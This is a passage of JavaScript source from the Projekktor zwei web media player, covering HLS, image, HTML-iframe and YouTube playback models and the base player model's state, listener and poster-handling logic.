	var mediaContainer = $('#'+this.pp.getMediaId()+'_audio_container')
	if (mediaContainer.length==0) {
	    mediaContainer = $('<div/>')
		.css({width: '1px', height: '1px', marginBottom: '-1px'})
		.attr('id', this.pp.getMediaId()+"_audio_container")
		.prependTo( this.pp.getDC() );	    
	}        
        
        mediaContainer.html('').append(
            $('<audio/>')
            .attr({
                "id": this.pp.getMediaId()+"_html",         
                "poster": $p.utils.imageDummy(),
                "loop": false,
                "autoplay": false,
                "x-webkit-airplay": "allow"
            }).prop({
                controls: false,
                volume: this.getVolume()
            }).css({
                width: '1px',
                height: '1px',
                position: 'absolute',
                top: 0,
                left: 0                
            })
        );
            
	
	
	this.mediaElement = $('#'+this.pp.getMediaId()+"_html");

	this.applySrc();
               
    },    
    
    setPosterLive: function() {
	if (this.imageElement.parent) {
	    var dest = this.imageElement.parent(),
		ref = this;
	    
	    if (this.imageElement.attr('src') == ref.pp.getConfig('poster'))
		return;
	     
	    this.imageElement.fadeOut('fast', function() {
		$(this).remove();
		ref.imageElement = ref.applyImage(ref.pp.getConfig('poster'), dest );	
	    })
	}
    }
    
}, 'VIDEO');


$p.newModel({
    
    modelId: 'VIDEOHLS',
    
    androidVersion: 3,
    iosVersion: 4,
    
    iLove: [
	{ext:'m3u8', type:'application/mpegURL', platform: ['ios', 'android'], streamType: ['http','httpVideo', 'httpVideoLive']},
        {ext:'m3u', type:'application/mpegURL', platform: ['ios', 'android'], streamType: ['http', 'httpVideo', 'httpVideoLive']},
	// {ext:'m3u8', type:'vnd.apple.mpegURL', platform:'ios'},
        // {ext:'m3u', type:'vnd.apple.mpegURL', platform:'ios'},
        {ext:'ts', type:'video/MP2T', platforms: ['ios' ,'android'], streamType: ['http', 'httpVideo', 'httpVideoLive']}        
    ]
    
}, 'VIDEO');





});
/*
 * this file is part of: 
 * projekktor zwei
 * http://filenew.org/projekktor/
 *
 * Copyright 2010, 2011, Sascha Kluger, Spinning Airwhale Media, http://www.spinningairwhale.com
 * under GNU General Public License
 * http://www.filenew.org/projekktor/license/
*/
jQuery(function($) {
$p.newModel({
    
    modelId: 'IMAGE',
    iLove: [
	{ext:'jpg', type:'image/jpeg', platform:'browser', streamType: ['http']},
	{ext:'gif', type:'image/gif', platform:'browser', streamType: ['http']},
	{ext:'png', type:'image/png', platform:'browser', streamType: ['http']}
    ],
    
    allowRandomSeek: true,

    _position: 0,
    _duration: 0,
    
    applyMedia: function(destContainer) {
	this.mediaElement = this.applyImage(this.media.file[0].src, destContainer.html(''));
	this._duration = this.pp.getConfig('duration');
	this._position = -1;
	this.displayReady();
	this._position = -0.5;	
    },    
    
    /* start timer */
    setPlay: function() {

	var ref = this;
	
        this._setBufferState('full');
	this.progressListener(100);
	this.playingListener();	
        
	if (this._duration==0) {
	    ref._setState('completed');
	    return;
	}
	
	(function() {

	    if (ref._position>=ref._duration) {
		ref._setState('completed');
		return;
	    }
	    
	    if (!ref.getState('PLAYING'))
		return;
	    
	    ref.timeListener({duration: ref._duration, position:ref._position});
	    setTimeout(arguments.callee,500);
	    ref._position += 0.5;	    
	})();	
	
    },
    
    detachMedia: function() {
        this.mediaElement.remove();
    },
    
    setPause: function() {
	this.pauseListener();
    },   
            
    setSeek: function(newpos) {
        if (newpos<this._duration) {
	    this._position = newpos;
	}
    }
    
});

$p.newModel({
    
    modelId: 'HTML',
    iLove: [
	{ext:'html', type:'text/html', platform:'browser', streamType: ['http']}
    ],
    
   applyMedia: function(destContainer) {
        var ref = this;
         
        this.mediaElement = $(document.createElement('iframe')).attr({
            "id": this.pp.getMediaId()+"_iframe",
            "name": this.pp.getMediaId()+"_iframe",
            "src": this.media.file[0].src,
            "scrolling": 'no',
            "frameborder": "0",
            'width': '100%',
            'height': '100%'
        }).css({
            'overflow': 'hidden',
            'border': '0px',
            "width": '100%',
            "height": '100%'            
        }).appendTo(destContainer.html(''));
        
        this.mediaElement.load(function(event){ref.success();});
        this.mediaElement.error(function(event){ref.remove();});
	
	this._duration = this.pp.getConfig('duration');
        
    },
    
    success: function() {   
        this.displayReady();
    },
    
    remove: function() {
        this.mediaElement.remove();        
    }    
}, 'IMAGE');
});
/*
 * this file is part of: 
 * projekktor zwei
 * http://filenew.org/projekktor/
 *
 * Copyright 2010, 2011, Sascha Kluger, Spinning Airwhale Media, http://www.spinningairwhale.com
 * under GNU General Public License
 * http://www.filenew.org/projekktor/license/
*/
// http://code.google.com/apis/youtube/js_api_reference.html#Embedding
jQuery(function($) {
$p.newModel({
    
    modelId: 'YTVIDEO',
    iLove: [
	{ext:'youtube.com', type:'video/youtube', platform:'flash', fixed:'maybe'}
    ],
    
    allowRandomSeek: true,
    useIframeAPI: true,
    flashVerifyMethod: 'cueVideoById',
    
    _ffFix: false,
    _updateTimer: null,
    
    init: function(params) {
	
	var ref = this;
	
	this.useIframeAPI = this.pp.getConfig('useYTIframeAPI') || this.pp.getIsMobileClient();
	this.hasGUI = this.pp.getIsMobileClient();
	
	
	if (!this.useIframeAPI) {
	    this.requiresFlash = 8;
	    this.ready();
	    return;
	}
	
	var id = this.pp.getId();
	
	// load youtube API stuff if required:
	if (window.ProjekktorYoutubePlayerAPIReady!==true) {
	    $.getScript('http://www.youtube.com/player_api');
	    // we can´t use the getscript onready callback here
	    // coz youtube does some additional ubersecret stuff
	    (function() {
		try{
		    if(window.ProjekktorYoutubePlayerAPIReady==true){
			ref.ready();
			return;
		    }
		    setTimeout(arguments.callee,50);	
		} catch(e) {
		    setTimeout(arguments.callee,50);    
		}
	       
	    })();	    
	}
	else {
	    this.ready();
	}
	
    	
	window.onYouTubePlayerAPIReady = function() {
	    window.ProjekktorYoutubePlayerAPIReady=true;
	}
    },
    
    applyMedia: function(destContainer) {
	
	this._setBufferState('empty');

	var ref = this,
	    width = (this.modelId=='YTAUDIO') ? 1 : '100%',
	    height = (this.modelId=='YTAUDIO') ? 1 : '100%';
	
	if (this.modelId=='YTAUDIO')
	    this.imageElement = this.applyImage(this.pp.getPoster(), destContainer);

	if (this.useIframeAPI) {

	    destContainer
		.html('')
		.append(
		    $('<div/>').attr('id', this.pp.getId()+'_media_youtube' )
		    .css({
			width: '100%',
			height: '100%',
			position: 'absolute',
			top: 0,
			left: 0
		    })		    
		);
	    var shield = $('<div/>').attr('id', this.pp.getId()+'_media_youtube_cc' )
		.css({
		    width: '100%',
		    height: '100%',
		    backgroundColor: ($p.utils.ieVersion()) ? '#000' : 'transparent',
		    filter: 'alpha(opacity = 0.1)',
		    position: 'absolute',
		    top: 0,
		    left: 0
		});
	    
	    destContainer.append(shield);
		    
	    this.mediaElement = new YT.Player( this.pp.getId()+'_media_youtube', {
		width: (this.pp.getIsMobileClient()) ? this.pp.config._width : width,
		height: (this.pp.getIsMobileClient()) ? this.pp.config._height : height,
		playerVars: {
		    autoplay: 0,
		    disablekb: 0,
		    version: 3,
		    start: 0,
		    controls: (this.pp.getIsMobileClient()) ? 1 : 0,
		    showinfo: 0,
		    enablejsapi: 1,
		    start: (this.media.position || 0),
		    origin: window.location.href,
		    wmode: 'transparent', 
		    modestbranding: 1
		},
		videoId: this.youtubeGetId(),
		events: {
		    'onReady': function(evt) {ref.onReady(evt);}, // 'onReady'+ this.pp.getId(),
		    'onStateChange': function(evt) {ref.stateChange(evt);},
		    'onError':  function(evt) {ref.errorListener(evt);}
		}
	    });
	    
	    
	} else {
	    	    	
	    var domOptions = {
		id: this.pp.getId()+"_media_youtube",
		name: this.pp.getId()+"_media_youtube",
		src: 'http://www.youtube.com/apiplayer',
		width: (this.pp.getIsMobileClient()) ? this.pp.config._width : width,
		height: (this.pp.getIsMobileClient()) ? this.pp.config._height : height,
		bgcolor: '#000000',
		allowScriptAccess:"always",
		wmode: 'transparent',
		FlashVars: {
		    enablejsapi: 1,
		    autoplay: 0,
		    version: 3,
		    modestbranding: 1,
		    showinfo: 0
		}
	    };
	    this.createFlash(domOptions, destContainer);
	}
	
    },
    
    /* OLD API - flashmovie loaded and initialized - cue youtube ID */
    flashReadyListener: function() {
	this._youtubeResizeFix();
	this.addListeners();
	this.mediaElement.cueVideoById( this.youtubeGetId(), this.media.position || 0, this._playbackQuality );
    },
    
    
    /* OLD API - workaround for youtube video resize bug: */
    _youtubeResizeFix: function() {
	/*
	$(this.mediaElement).attr({
	    width: '99.99999%',
	    height: '99.9999%'
	});
	*/
	this.applyCommand('volume', this.pp.getConfig('volume'));
    },    
  
    /* OLD API */
    addListeners: function() {
	// if (this.useIframeAPI===true) return;
	this.mediaElement.addEventListener("onStateChange", "projekktor('"+this.pp.getId()+"').playerModel.stateChange");
	this.mediaElement.addEventListener("onError", "projekktor('"+this.pp.getId()+"').playerModel.errorListener");	
	this.mediaElement.addEventListener("onPlaybackQualityChange", "projekktor('"+this.pp.getId()+"').playerModel.qualityChangeListener");
    },
    
    setSeek: function(newpos) {
        try {
	    this.mediaElement.seekTo(newpos, true);
	    if (!this.getState('PLAYING'))
		this.timeListener({position:this.mediaElement.getCurrentTime(),duration:this.mediaElement.getDuration()});
	} catch(e){}
    },
    
    setVolume: function(newvol) {	
	try {this.mediaElement.setVolume(newvol*100);} catch(e){}
    },    
    
    setPause: function(event) {
	try {this.mediaElement.pauseVideo();} catch(e){}
    },      
    
    setPlay: function(event) {
        try {this.mediaElement.playVideo();}catch(e){}	
    },

    setQuality: function(quality) {
	try{this.mediaElement.setPlaybackQuality(quality)} catch(e) {}
    },

    getVolume: function() {
        try {return this.mediaElement.getVolume();} catch(e){};
	return 0;
    },
    
    getPoster: function() {
	return this.media['config']['poster'] || this.pp.config.poster || 'http://img.youtube.com/vi/' + this.youtubeGetId() + '/0.jpg';
    },

    getPlaybackQuality: function() {
	try {return this.mediaElement.getPlaybackQuality();}catch(e){ return false;}	
    },

    getSrc: function() {
	return this.youtubeGetId() || null;
    },    
    
    errorListener: function(code) {
	switch ( (code.data==undefined) ? code : code.data ) {
	    case 100:
		this.setTestcard(500);
		break;
	    case 101:
	    case 150:
		this.setTestcard(501);
		break;
	    case 2:
		this.setTestcard(502);
		break;
	}
    },
    
    stateChange: function(eventCode) {
	// unstarted (-1), ended (0), playing (1), paused (2), buffering (3), video cued (5).
	clearTimeout(this._updateTimer);        
	if (this.mediaElement===null || this.getState('COMPLETED')) return;
	switch ((eventCode.data==undefined) ? eventCode : eventCode.data) {
	    case -1:
		this.setPlay();		
		this.ffFix = true;	
		break;
	    case 0:
                // fixing a YT API bug:
		if (this.getState('AWAKENING')) break;
                this._setBufferState('full');
		this.endedListener({});
		break;
	    case 1:
		this._setBufferState('full');
		
		if ( (this.media.position || 0) > 0 && this._isFF() && this.ffFix) {
		    this.ffFix = false;
		    this.setSeek(this.media.position);
		}
		    
		this.playingListener({});
		this.canplayListener({});
		this.updateInfo();		
		break;
	    case 2:
		this.pauseListener({});
		break;
	    case 3:
		this.waitingListener({});
		break;
	    case 5:
		if (this.useIframeAPI!==true)
		    this.onReady();		

		break;	    
	}
    },
    
    onReady: function() {
	
	this.setVolume(this.pp.getVolume());
	
	$( '#'+this.pp.getId()+'_media' )
	    .attr('ALLOWTRANSPARENCY', true)
	    .attr({scrolling:'no', frameborder: 0})
	    .css({
		'overflow': 'hidden',
		'display': 'block',
		'border': '0'
	    })
	
	if (this.media.title ||  this.pp.config.title || this.pp.getIsMobileClient() ) {
	    this.displayReady();
	    return;
	}
	
	var ref = this;

	$.ajax({
	    url: 'http://gdata.youtube.com/feeds/api/videos/'+ this.youtubeGetId() +'?v=2&alt=jsonc',
	    async: false,
	    complete: function( xhr, status) {
		
		try {
		    data = xhr.responseText;
		    if (typeof data == 'string') {
			data = $.parseJSON(data);
		    }
		    if (data.data.title) {
			ref.sendUpdate('config', {title: data.data.title + ' (' + data.data.uploader + ')'});
		    }
		} catch(e){};
		ref.displayReady();
	    }
	});	
    },
    
    youtubeGetId: function() {
	return encodeURIComponent( this.media.file[0].src.replace(/^[^v]+v.(.{11}).*/,"$1") );
    },
    
    updateInfo: function() {	
	var ref=this;	
	clearTimeout(this._updateTimer);
	(function() {
	    if(ref.mediaElement==null) {
		clearTimeout(ref._updateTimer);
		return;
	    }
	    try{
		if (ref.getState('PLAYING')) {
		    ref.timeListener({position:ref.mediaElement.getCurrentTime(),duration:ref.mediaElement.getDuration()});
		    ref.progressListener({loaded:ref.mediaElement.getVideoBytesLoaded(),total:ref.mediaElement.getVideoBytesTotal()});
                    ref._updateTimer = setTimeout(arguments.callee,500);                    
		}
	    } catch(e) {}
	    		    
	})();
    }
});

$p.newModel({
    
    modelId: 'YTAUDIO',
    iLove: [
	{ext:'youtube.com', type:'audio/youtube', platform:'flash', fixed:'maybe'}
    ]
    
}, 'YTVIDEO');
});
/*
 * this file is part of: 
 * projekktor zwei
 * 
 *
 * Copyright 2010, 2011, Sascha Kluger, Spinning Airwhale Media, http://www.spinningairwhale.com
 * under GNU General Public License
 * http://www.filenew.org/projekktor/license/
*/
var playerModel = function(){};
jQuery(function($) {
playerModel.prototype = {   
    
    modelId: 'player',
    iLove: [],
    
    // all the player states
    _currentState: null,
    _currentBufferState: null,
    
    _ap: false, // autday
    _volume: 0, // async
    _quality: 'default',
    
    _displayReady: false,
    _isPlaying: false,

    _id: null,
    
    // experimental
    _KbPerSec: 0,    
    _bandWidthTimer: null,
    
    // flags
    _isPoster: false,
    _isFullscreen: false,
    
    hasGUI: false,
    allowRandomSeek: false,
    
    flashVerifyMethod: 'api_get',  
    mediaElement: null,
    
    pp: {},    
        
    media: {
        duration: 0,
        position: 0,
        maxpos: 0,
        offset: 0,        
        file: false,
        poster: '',
        ended: false,
	loadProgress:0,
	errorCode:0
    },

    /*******************************
    *        CORE
    *******************************/       
    _init: function(params){
	this.pp = params.pp || null;
        this.media = $.extend(true, {}, this.media, params.media);
	this._ap = params.autoplay;
	this._isFullscreen = params.fullscreen;
	this._id = $p.utils.randomId(8);
	this._quality = params.quality || this._quality;
	this._volume = this.pp.getVolume();
	this._playbackQuality = this.pp.getPlaybackQuality();
	this.init();
 
    },
    
    init: function(params) {
	this.ready();
    },
    
    ready: function() {
	this.sendUpdate('modelReady');
	if (this._ap) {
	    this.sendUpdate('autostart', true);
	    this._setState('awakening');
	}
	else this.displayItem(false);
    },
    
    /* apply poster while sleeping or get ready for true multi media action */
    displayItem: function(showMedia) {

        // reset
	this._displayReady = false;
	this._isPoster = false;

	this.pp.removeListener('fullscreen.poster');
	this.pp.removeListener('resize.poster');

	// poster 
	if (showMedia!==true || this.getState('STOPPED') ) {
	    this._setState('idle');
	    this.applyImage(this.getPoster(), this.pp.getMediaContainer().html(''));	        
	    this._isPoster = true;	    
	    this.displayReady();
	    return;
	} 

	// media
	$('#'+this.pp.getMediaId()+"_image").remove();

	// remove testcard (if any)
	$("#"+this.pp.getId()+'_testcard_media').remove();

        // apply media
	this.applyMedia(this.pp.getMediaContainer());	
    },
    
    applyMedia: function() {},
    
    sendUpdate: function(type, value) {
	this.pp._modelUpdateListener(type, value);
    },
    
    /* wait for the playback element to initialize */    
    displayReady: function(){
	this._displayReady = true;
	this.pp._modelUpdateListener('displayReady');
    },
    
    start: function() {

	var ref = this;

	if (this.mediaElement==null && this.modelId!='PLAYLIST') return;

	if (this.getState('STARTING')) return;

	this._setState('STARTING');

	if (!this.getState('STOPPED') ) 
	    this.addListeners();

	if (this.pp.getIsMobileClient('ANDROID') && !this.getState('PLAYING')) {
	    setTimeout(function() {ref.setPlay()}, 500);
	}

	this.setPlay();
      
    },
    
        
    addListeners: function() {},
    
    removeListeners: function() {
	try {this.mediaElement.unbind('.projekktor'+this.pp.getId());} catch(e){};
    }, 
        
    detachMedia: function() {},            

    destroy: function(silent) {
	this.removeListeners();    	
	
        if (!this.getState('IDLE'))
            this._setState('destroying');
            
        this.detachMedia();

        try {$('#'+this.mediaElement.id).empty();}catch(e){}
	if (!this.pp.getIsMobileClient()) {
	    try {$('#'+this.mediaElement.id).remove();}catch(e){}
	    try {this.mediaElement.remove();}catch(e){}			        
	    this.pp.getMediaContainer().html('');
	}
        this.mediaElement = null;
	
	this.media.loadProgress = 0;
	this.media.playProgress = 0;
        this.media.frame = 0;
	this.media.position = 0;
	this.media.duration = 0;
    },
        
    /* firefox reinit-issue-workaround-helper-thingy */
    reInit: function() {

	// no FF:
	if (this.flashVersion!=false || !this._isFF() || this.getState('ERROR') || this.pp.getConfig('bypassFlashFFFix')===true) {
	    return;
	}

	// elsewise nuke:
	this.sendUpdate('FFreinit');
        this.removeListeners();
 	this.displayItem((!this.getState('IDLE')));
    },
        
    applyCommand: function(command, value) {	
        switch(command) {
	    case 'quality':		
		this.setQuality(value);
		break;
            case 'play':
		if (this.getState('ERROR')) break;				
		if (this.getState('IDLE')) {
		    this._setState('awakening');
		    break;
		}		
                this.setPlay();
                break;
            case 'pause':
		if (this.getState('ERROR')) break;		
                this.setPause();
                break;
            case 'volume':
		if (this.getState('ERROR')) break;
                if (!this.setVolume(value)) {
		    this._volume = value;
		    this.sendUpdate('volume', value);
		}
                break;
	    case 'stop':
		this.setStop();
		break;
            case 'frame':
                this.setFrame(value);
                break;
            case 'seek':
		if (this.getState('ERROR')) break;
                if (this.getState('SEEKING')) break;
                if (this.getState('IDLE')) break;  
		if (this.media.loadProgress==-1 ) break;

                this._setState('seeking');                
		this.sendUpdate('seek', value);
                this.setSeek(value);                
                
                break;
            case 'fullscreen':
                if (value==this._isFullscreen) break;
                    this._isFullscreen = value;
		this.sendUpdate('fullscreen', this._isFullscreen);
                this.setFullscreen(value);		
		this.reInit();
                break;
	    case 'resize':
		this.setResize();
		this.sendUpdate('resize', value);
		break;
        }        
    },   
         
    /*******************************
    *   PUBLIC ELEMENT SETTERS 
    *******************************/
    setFrame: function(frame) {
        var newPos = (frame / this.pp.getConfig('fps')) + 0.00001;
	this.setSeek(newPos);
    },
            
    setSeek: function(newpos) {},

    setPlay: function() {},
    
    setPause: function() {},
    
    setStop: function() {
	this.detachMedia();
	this._setState('stopped');
	this.displayItem(false);
    },
            
    setVolume: function(volume) {},   
    
    setFullscreen: function(inFullscreen) {
        this.setResize();
    },

    setResize: function() {
        var destContainer = this.pp.getMediaContainer();
        this.sendUpdate('scaled', {
            realWidth: this.media.videoWidth || null,
            realHeight: this.media.videoHeight || null,
            displayWidth: destContainer.width(),
            displayHeight: destContainer.height()
        });
	 
    },
    
    setPosterLive: function() {},
    
    setQuality: function(quality) {
	
	var resultSrc = [];

	if (this._quality==quality) return;
	this._quality = quality;
        
        if (this.getState('PLAYING') || this.getState('PAUSED'))
            this.applySrc();
        
	this.qualityChangeListener();
        
    },
    
    applySrc: function() {},
    
    getSource: function() {

	var resultSrc = [],
	    offset = this.media.offset || false,
	    ref = this,
            pseudoQuery = ( this.pp.getConfig('streamType')=='pseudo') ? this.pp.getConfig('startParameter') : false;            

	$.each(this.media.file || [], function() {

	    // set proper quality source
	    if (ref._quality!=this.quality && ref._quality!=null)
		return true;
        
	    // nothing todo 
	    if (!pseudoQuery || !offset) {
		resultSrc.push(this);
		return true;
	    }
	    
	    // add offset_GET-parameter
	    var u = $p.utils.parseUri( this.src ),
		src = u.protocol + '://' + u.host + u.path,
		query = [];

	    $.each(u.queryKey, function(key, value){
		if (key!=pseudoQuery) {
                    query.push(key + "=" + value);
		}
	    })
	    
	    src += (query.length > 0) ? '?' + query.join('&') + "&" + pseudoQuery + "=" + offset : "?" + pseudoQuery + "=" + offset;	    
	    this.src = src;
	    
	    resultSrc.push(this);
	    return true;
	})
	
	if (resultSrc.length==0)
	    return this.media.file;
	else	    
	    return resultSrc;
    },
    
    
    /*******************************
            ELEMENT GETTERS 
    *******************************/             
    getVolume: function() {
	if (this.mediaElement==null)
	    return this._volume;
	
        return (this.mediaElement.prop('muted')==true) ? 0 : this.mediaElement.prop('volume');        
    },

    getLoadProgress: function() {
        return this.media.loadProgress || 0;        
    },
    
    getLoadPlaybackProgress: function() {
        return this.media.playProgress || 0;        
    },

    getPosition: function() {
        return this.media.position || 0;          
    },
    
    getFrame: function() {
        return this.media.frame || 0;          
    },

    getDuration: function() {
        return this.media.duration || 0;   
    },
    
    getMaxPosition: function() {
        return this.media.maxpos || 0;
    },
    
    getPlaybackQuality: function() {
	return ($.inArray(this._quality, this.media.qualities)>-1)
	    ? this._quality
	    : 'default';
    },
    
    getInFullscreen: function() {        
        return this.pp.getInFullscreen();
    },    
    
    getKbPerSec: function() {
	return this._KbPerSec;
    },
    
    getState: function(isThis) {	
	var result = (this._currentState==null) ? 'IDLE' : this._currentState;
	if (isThis!=null) return (result==isThis.toUpperCase());
	return result;
    },
    
    getSrc: function() {
        try { return this.mediaElement[0].currentSrc; } catch(e) {}
        try { return this.media.file[0].src; } catch(e) {}
        try { return this.getPoster(); } catch(e) {}
        return null;
    },

    getModelName: function() {
	return this.modelId || null;
    },
    
    getHasGUI: function() {
	return (this.hasGUI && !this._isPoster);
    },
    
    getIsReady: function() {
	return this._displayReady;
    },
    
    getPoster: function() {        
        var result = this.pp.getConfig('poster'),
            qual = 'default',
            quals = [];
            
        if (typeof result!='object' )
            return result;
        
        for (var i in result) {
            if (result[i].quality) {
                quals.push(result[i].quality);
            }
        }
        
        qual = this.pp._getAppropriateQuality(quals);
        
        for (var i in this.pp.getConfig('poster')) {
            if (this.pp.getConfig('poster')[i].quality==qual) {
                result = this.pp.getConfig('poster')[i].src || null;
                break;
            }            
        }
     
        return result;
    },
    
    getMediaElement: function() {
	return this.mediaElement || $('<video/>');
    },
    
    getMediaDimensions: function() {
        return {
            width: this.media.videoWidth || 0,
            height: this.media.videoHeight || 0
        }    
    },
    
    
    /*******************************
    *      ELEMENT LISTENERS
    *******************************/    
    timeListener: function(obj) {

	if (obj==null) return;
        if (this.getState('SEEKING') && this.isPseudoStream) return;

	var position = parseFloat( (obj.position || obj.currentTime || this.media.position || 0).toFixed(2) ),
	    duration = parseFloat( (obj.duration || 0).toFixed(2) );
            
	// bypass strange IE flash bug	
	if ( isNaN(duration+position)) return;

        // duration has changed:	
        if ( duration!=0 && (duration!=this.media.duration && !this.isPseudoStream) || (this.isPseudoStream && this.media.duration==0) ) {
            this.media.duration = duration;
            this.sendUpdate('durationChange', duration);
        }
        
        // remember values & concider pseudo stream position offset
    	this.media.position = this.media.offset + position;
	this.media.maxpos = Math.max(this.media.maxpos || 0, this.media.position || 0);	
	this.media.playProgress =  parseFloat( (this.media.position>0 && this.media.duration>0) ? this.media.position * 100 / this.media.duration : 0 );	
        this.media.frame = this.media.position * this.pp.getConfig('fps');              
	this.sendUpdate('time', this.media.position);

	this.loadProgressUpdate();
    },

    loadProgressUpdate: function() {

        var me = this.mediaElement.get(0),
            progress = 0;

        if (typeof me.buffered!=='object') return;
        if (me.buffered.length==0) return;
        if (this.media.loadProgress==100) return;
        
        if (me.seekable && me.seekable.length>0) {
            progress = Math.round(me.seekable.end(0)*100 / this.media.duration); 
        } else {
            progress = Math.round(me.buffered.end( me.buffered.length-1)*100) / this.media.duration;
        }

        if (this.media.loadProgress>progress) return;
        
        this.media.loadProgress = (this.allowRandomSeek===true) ? 100 : -1;
        this.media.loadProgress = (this.media.loadProgress<100 || this.media.loadProgress==undefined) ? progress : 100;

        this.sendUpdate('progress', this.media.loadProgress);

    },

    progressListener: function(obj, evt) {

	// we prefer timeranges but keep catching "progress" events by default
	// for historical and compatibility reasons:	
        if (this.mediaElement instanceof jQuery) { // fix this - make sure all instances are jquery objects
            if (typeof this.mediaElement[0].buffered=='object') {
                if (this.mediaElement[0].buffered.length>0) {
                    this.mediaElement.unbind('progress');
                    return;
                }
            }
        }

	if (this._bandWidthTimer==null) {
	    this._bandWidthTimer = (new Date()).getTime();
	}
	
	var current = 0,
	    total = 0;	
        try {
            if (!isNaN(evt.loaded / evt.total)) {	    
                current = evt.loaded;
                total = evt.total;
            } else if (evt.originalEvent && !isNaN(evt.originalEvent.loaded / evt.originalEvent.total)) {
                current = evt.originalEvent.loaded;
                total = evt.originalEvent.total;
            }
        } catch(e) {
            if ( obj && !isNaN(obj.loaded / obj.total)) {
                current = obj.loaded;
                total = obj.total;	
            }
            
            /*else {	    
	    try {
		this.media.loadProgress = (this.allowRandomSeek===true) ? 100 : -1;
		this.sendUpdate('progress', this.media.loadProgress);
	    } catch(e){};
	   return;	   
            } */
            
        }

	var loadedPercent = (current>0 && total>0) ? current * 100 / total : 0 ;

	if (Math.round(loadedPercent)>Math.round(this.media.loadProgress)) {
	    this._KbPerSec = (  (current/1024) /  ( ((new Date()).getTime() - this._bandWidthTimer) / 1000) );
	}
    
	loadedPercent = (this.media.loadProgress!==100) ? loadedPercent : 100;
	loadedPercent= (this.allowRandomSeek===true) ? 100 : 5 * Math.round(loadedPercent/5);;

	if (this.media.loadProgress != loadedPercent) {
	    this.media.loadProgress = loadedPercent
	    this.sendUpdate('progress', loadedPercent);
	}
	
	// Mac flash fix:
	if ( this.media.loadProgress>=100 && this.allowRandomSeek==false) {
	    this._setBufferState('full');
	    
	}
    },
    
    qualityChangeListener: function() {
	this.sendUpdate('qualityChange', this._quality);	
    },
    
    endedListener: function(obj) {
	if (this.mediaElement===null) return;     
	if (this.media.maxpos<=0) return;
        if (this.getState()=='STARTING') return;
	this._setState('completed'); 
    },
    
    waitingListener: function(event) {
	this._setBufferState('empty');
    },
            
    canplayListener: function(obj) {
	this._setBufferState('full');	
    },

    canplaythroughListener: function(obj) {
	this._setBufferState('full'); 
    },
    
    suspendListener: function(obj) {
        this._setBufferState('full'); // hmmmm...
    },   
        
    playingListener: function(obj) {
	// check for missing source
	// if (this.getSrc()==null) {
	    // this.setTestcard(10);
	    // return;
	// }
	this._setState('playing'); 
    },    
    
    startListener: function(obj) {
	this.applyCommand('volume', this.pp.getConfig('volume'));	
	if (!this.isPseudoStream)
            this.setSeek(this.media.position || 0);
         
	this._setState('playing'); 
    },       

    pauseListener: function(obj) {
	this._setState('paused'); 
    },
    
    seekedListener: function(obj) {
        this._setState('SEEKED');
    },
        

    volumeListener: function(obj) {        
        this.sendUpdate('volume', this.getVolume());
    },

    flashReadyListener: function() {
	this._displayReady = true;	
    },  

    errorListener: function(event, obj) {},
    
    metaDataListener: function(obj) {
	try {
	    this.media.videoWidth = obj.videoWidth;
	    this.media.videoHeight = obj.videoHeight;	
	} catch(e) {};
	this._scaleVideo();
    },


    setTestcard: function(code, txt) {
	
        var destContainer = this.pp.getMediaContainer().html('').css({width:'100%',height:'100%'}),
	    messages  = this.pp.getConfig('messages'),
	    msgTxt = (txt!=undefined && txt!='') ? txt : (messages[code]!=undefined) ? messages[code] : messages[0];
	
        if (this.pp.getConfig('skipTestcard') && this.pp.getItemCount() > 1) {
            this._setState('completed');            
            return;
        }        
        
        if (this.pp.getItemCount()>1) {
	    // "press next to continue"
            msgTxt += ' ' + messages[99];
        }        

	if (msgTxt.length<3) {
	    msgTxt = 'ERROR';
	}

	if (code==100) {
	    msgTxt = txt;
	}
	
	msgTxt = $p.utils.parseTemplate(msgTxt, $.extend(
	    {},this.media,{title: this.pp.getConfig('title')})
	);
	
	this.mediaElement  = $('<div\>')
	    .addClass(this.pp.getNS()+'testcard')
	    .attr('id', this.pp.getId()+'_testcard_media')
            .html('<p>'+msgTxt+'</p>')
	    .appendTo(destContainer);
            
	this._setState('error'); 	
    },

    applyImage: function(url, destObj) {

	var imageObj = $('<img/>').hide(),
	    ref = this;
	 
	$p.utils.blockSelection(imageObj);
	 
        // empty URL... apply placeholder
        if (url=='' || url==undefined) {
            return $('<span/>').attr({"id": this.pp.getMediaId()+"_image"}).appendTo(destObj);	    
        }

	imageObj.html('').appendTo(destObj).attr({
            "id": this.pp.getMediaId()+"_image",            
	    "alt":  this.pp.getConfig('title') || ''
        }).css({position: 'absolute'});

	imageObj.error(function(event){
	    $(this).remove();
	});

        imageObj.load(function(event){
            var dest = event.currentTarget;
            if (!imageObj.data('od')) {
                imageObj.data('od', {width: dest.naturalWidth, height: dest.naturalHeight})
            }
            imageObj.show();            
            $p.utils.stretch(ref.pp.getConfig('imageScaling'), imageObj, destObj.width(), destObj.height());                   
        });	    
	
        // IE<9 trap:
        imageObj.attr('src', url);

	var onReFull = function(imgObj, destObj) {
        
	    if (destObj.is(':visible')===false) {
		ref.pp.removeListener('fullscreen', arguments.callee);
	    }

	    var tw = destObj.width(),
		th = destObj.height(),	
		wid = imgObj.width(),
	    	hei = imgObj.height();            
            
	    if ( $p.utils.stretch(ref.pp.getConfig('imageScaling'), imgObj, destObj.width(), destObj.height()) ) {
                try {
                    ref.sendUpdate('scaled', {
                        realWidth: imgObj._originalDimensions.width,
                        realHeight: imgObj._originalDimensions.height,
                        displayWidth: ref.mediaElement.width(),
                        displayHeight: ref.mediaElement.height()
                    });
                } catch(e) {}
            }
                        
            if (imgObj.attr('src')!=ref.getPoster()) {
                imgObj.attr('src', ref.getPoster());
            }
	}
	
	this.pp.addListener('fullscreen.poster', function() { onReFull(imageObj, destObj);} );
	this.pp.addListener('resize.poster', function() { onReFull(imageObj, destObj);} );
	    
	return imageObj;
    },


    
    /* X-Browser flash embedd mess */
    createFlash: function(domOptions, destObj, shield){        
        this.mediaElement = $p.utils.embeddFlash(destObj.html(''), domOptions, shield, true);
	this._waitforPlayer();
    },
    
    /* we have to wait for the flash components to load and initialize */
    _waitforPlayer: function() {

        if (this._displayReady==true) return;
        
        this._setBufferState('empty');
              
        var ref = this, counter=0;

	(function() {

            // this is the most fucked up FF bug sh*t ever:
            if (counter>6 && ref._isFF()) {
                counter=0;
                var dest = $(ref.mediaElement).parent(),
                    clone = $(ref.mediaElement).clone();
                dest.html('').append(clone);
                ref.mediaElement = clone.get(0);
            }           

	    var dest = ref.mediaElement;

            try {
                if ($(dest).attr('id').indexOf('testcard')>-1)
                    return;
            } catch(e) {}
            
            counter++;
	    try{
      
		if (dest==undefined) {		    
